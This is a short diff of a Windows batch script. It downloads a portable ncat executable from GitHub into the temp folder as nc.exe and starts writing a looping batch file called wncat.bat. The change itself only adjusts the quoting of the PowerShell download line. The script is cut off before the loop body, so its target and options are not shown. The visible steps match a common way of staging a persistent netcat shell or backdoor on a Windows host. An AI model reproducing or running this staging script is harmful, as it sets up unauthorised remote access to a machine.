@@ -2,7 +2,7 @@
 
 cd %TEMP%
 
-powershell Invoke-WebRequest "https://github.com/cyberisltd/NcatPortable/blob/master/ncat.exe?raw=true" -OutFile .\nc.exe
+powershell "Invoke-WebRequest "https://github.com/cyberisltd/NcatPortable/blob/master/ncat.exe?raw=true" -OutFile .\nc.exe"
 
 echo @echo off > wncat.bat
 echo :loop >> wncat.bat
